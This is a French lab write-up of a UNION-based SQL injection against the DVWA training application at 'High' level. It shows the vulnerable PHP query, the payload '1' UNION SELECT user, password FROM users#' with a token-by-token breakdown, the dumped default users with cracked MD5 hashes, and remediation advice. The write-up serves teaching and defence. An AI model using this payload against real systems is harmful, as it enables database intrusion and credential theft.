# Rapport d'Exploitation — SQL Injection (DVWA Security Level : High)

---

## Contexte et Environnement

| Champ | Valeur |
|---|---|
| Cible | `192.168.250.87` |
| Module | SQL Injection |
| Niveau de sécurité | High |
| Base de données | MySQL |
| Langage backend | PHP |

---

## Analyse du Code Source Vulnérable

```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
```

La variable `$id` est concaténée directement dans la requête sans validation, échappement ou requête préparée.

La particularité du niveau **High** réside dans le mécanisme de saisie : l'ID est soumis via une page de session séparée (`session-input.php`). Cela ne constitue pas une protection contre une injection manuelle — c'est une mesure de sécurité par l'obscurité (*security through obscurity*).

---

## Méthodologie d'Exploitation

### Identification de la Vulnérabilité

La lecture du code source a permis de confirmer que l'entrée utilisateur était insérée sans protection. Le nombre de colonnes (2 : `first_name` et `last_name`) étant directement lisible dans le code, aucune phase de reconnaissance aveugle n'a été nécessaire.

### Payload Utilisé

```
1' UNION SELECT user, password FROM users#
```

### Décomposition du Payload

| Token | Rôle |
|---|---|
| `1'` | Ferme la valeur légitime de `$id` et rompt la syntaxe SQL attendue |
| `UNION SELECT` | Enchaîne une seconde requête fusionnée avec la première |
| `user, password` | Cible les colonnes correspondant aux deux colonnes retournées |
| `FROM users` | Cible la table contenant les credentials |
| `#` | Commentaire MySQL — neutralise le reste de la requête, y compris le `LIMIT 1` |

### Requête Réellement Exécutée

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'
UNION
SELECT user, password FROM users
```

---

## Résultats Obtenus

| Utilisateur | Hash MD5 | Mot de passe en clair |
|---|---|---|
| admin | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |
| gordonb | `e99a18c428cb38d5f260853678922e03` | `abc123` |
| 1337 | `8d3533d75ae2c3966d7e0d4fcc69216b` | `charley` |
| pablo | `0d107d09f5bbe40cade3de5c71e9e9b7` | `letmein` |
| smithy | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |

> Les hashes MD5 ont été inversés via rainbow table. MD5 est non salé par défaut et entièrement couvert par des bases publiques (CrackStation). Le NIST SP 800-63b recommande bcrypt, scrypt ou Argon2.

---

## Mesures de Remédiation

### Requêtes Préparées

```php
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```

### Hachage des Mots de Passe

```php
// Stockage
$hash = password_hash($plaintext, PASSWORD_BCRYPT);

// Vérification
password_verify($plaintext, $hash);
```

### Principe de Moindre Privilège

Le compte MySQL utilisé par l'application ne doit disposer que des droits `SELECT` sur les tables strictement nécessaires.

---

## Références

| Source | Lien |
|---|---|
| OWASP Top 10 – A03:2021 Injection | https://owasp.org/Top10/A03_2021-Injection/ |
| MITRE ATT&CK – T1190 | https://attack.mitre.org/techniques/T1190/ |
| NIST SP 800-63b | https://pages.nist.gov/800-63-3/sp800-63b.html |
| NIST SP 800-53 | https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final |
